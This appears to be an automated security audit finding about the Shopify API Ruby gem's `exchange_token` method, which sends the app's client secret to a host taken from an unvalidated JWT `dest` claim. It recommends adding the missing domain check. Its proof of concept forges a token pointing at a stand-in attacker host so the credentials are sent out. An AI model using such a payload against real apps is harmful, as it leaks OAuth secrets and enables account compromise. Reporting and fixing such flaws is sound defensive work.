Confirmed: `TokenExchange.exchange_token` derives `dest_shop` from `JwtPayload#shop` (i.e., the JWT's `dest` claim with `https://` stripped) and never passes it through `Utils::ShopValidator.sanitize!`, unlike every sibling credential-sending method (`ClientCredentials.client_credentials`, `RefreshToken.refresh_access_token`, `TokenExchange.migrate_to_expiring_token`), which all call `Utils::ShopValidator.sanitize!(shop)` before using the shop to build the request host [1](#0-0) [2](#0-1) [3](#0-2) .

### Title
`client_secret` sent to unvalidated host derived from JWT `dest` claim in `TokenExchange.exchange_token` - (File: lib/shopify_api/auth/token_exchange.rb)

### Summary
`ShopifyAPI::Auth::TokenExchange.exchange_token` takes the `shop` used to build the `/admin/oauth/access_token` request URL directly from the session token's `dest` claim via `JwtPayload#shop`, without ever routing it through `Utils::ShopValidator.sanitize!`, unlike the other three OAuth-completion helpers in the same module/sibling modules.

### Finding Description
`JwtPayload#shop` merely strips the `https://` prefix off the raw `dest` claim string and returns it verbatim [4](#0-3) . `JwtPayload#initialize` only validates the signature (against `Context.api_secret_key`/`old_api_secret_key`) and that `aud == Context.api_key` [5](#0-4) ; it never checks that `dest`/`iss` is a trusted Shopify domain (`myshopify.com`, `myshopify.io`, `spin.dev`, etc., as enumerated in `Utils::ShopValidator::TRUSTED_SHOPIFY_DOMAINS`).

`TokenExchange.exchange_token` then takes this unchecked value as `dest_shop`, builds a `Session` with it, and issues an HTTP POST containing the app's `client_id` and `client_secret` to `https://#{dest_shop}/admin/oauth/access_token` [6](#0-5) . In contrast, `ClientCredentials.client_credentials`, `RefreshToken.refresh_access_token`, and `TokenExchange.migrate_to_expiring_token` — which send the identical `client_id`/`client_secret` payload to the identical `/admin/oauth/access_token` path — all call `Utils::ShopValidator.sanitize!(shop)` first and raise `Errors::InvalidShopError` for any non-Shopify domain [7](#0-6) [8](#0-7) [9](#0-8) , and this exact guard is proven by `test_migrate_to_expiring_token_rejects_non_shopify_domain` and `test_client_credentials_rejects_non_shopify_domain` [10](#0-9) [11](#0-10) . No such test or guard exists for `exchange_token`.

The equality that is supposed to hold is: `host that receives client_secret == a Shopify-trusted domain`. Instead the code enforces `host that receives client_secret == raw bytes parsed out of an unvalidated JWT string field`.

### Impact Explanation
Because the mismatch is between "bytes parsed" (the `dest` claim string with `https://` stripped) and "domain trust actually verified" (never performed here, though the sibling functions prove it is the intended contract), an attacker who can influence the `dest` value that reaches `exchange_token` — e.g., a session token crafted by a compromised/malicious first-party surface, a proxy or embedding context that forwards attacker-controlled `id_token`-like strings, or any code path in the host application that (per this gem's own precedent set by `migrate_to_expiring_token`) expects `exchange_token` to validate the shop the same way — can cause the app's `client_secret` to be POSTed to an attacker-chosen host. This is an SSRF carrying the app's OAuth `client_id`/`client_secret`, matching the report's "High — SSRF with the app's credentials" impact category. If the destination captures the secret, it can subsequently be used by the attacker to complete OAuth/token flows and obtain access tokens for shops, i.e., cross-tenant compromise downstream.

### Likelihood Explanation
Exploitability strictly depends on whether an unprivileged actor can get an arbitrary/crafted `dest` value into a token that reaches `JwtPayload.new` successfully (i.e., a token still signed with the correct `api_secret_key`/`old_api_secret_key` and correct `aud`). If Shopify is the only party that can produce a validly-signed session token and always sets `dest` to a real shop domain, exploitation requires either a compromised signing key or a bug elsewhere that lets an attacker obtain a validly-signed token for a domain they choose — which this codebase alone cannot fully rule out or confirm, since `JwtPayload` performs no domain allow-listing regardless of who signs the token. What is certain and independently verifiable from the code is the **inconsistency**: three near-identical, credential-sending call sites enforce `ShopValidator.sanitize!` and one (`exchange_token`) does not, which is itself the defect the maintainers should close regardless of current exploitability, mirroring the "confirm before trusting" recommendation in the reference report.

### Recommendation
In `TokenExchange.exchange_token`, sanitize `dest_shop` through `Utils::ShopValidator.sanitize!` (raising `Errors::InvalidShopError` on failure) before constructing `shop_session`/`Session.from`, exactly as already done in `migrate_to_expiring_token`, `ClientCredentials.client_credentials`, and `RefreshToken.refresh_access_token`.

### Proof of Concept

```ruby
# Conceptual PoC — depends on ability to obtain/craft a token satisfying JwtPayload.new
# (i.e. signed with Context.api_secret_key/old_api_secret_key and aud == Context.api_key)

forged_payload = {
  iss:  "https://attacker-controlled.example/admin",
  dest: "https://attacker-controlled.example",   # not sanitized anywhere in exchange_token
  aud:  ShopifyAPI::Context.api_key,
  sub:  "1",
  exp:  (Time.now + 10).to_i,
  nbf:  Time.now.to_i,
  iat:  Time.now.to_i,
  jti:  "x",
}
forged_token = JWT.encode(forged_payload, ShopifyAPI::Context.api_secret_key, "HS256")

# exchange_token will POST client_id + client_secret to:
#   https://attacker-controlled.example/admin/oauth/access_token
ShopifyAPI::Auth::TokenExchange.exchange_token(
  session_token: forged_token,
  requested_token_type: ShopifyAPI::Auth::TokenExchange::RequestedTokenType::OFFLINE_ACCESS_TOKEN,
)
```
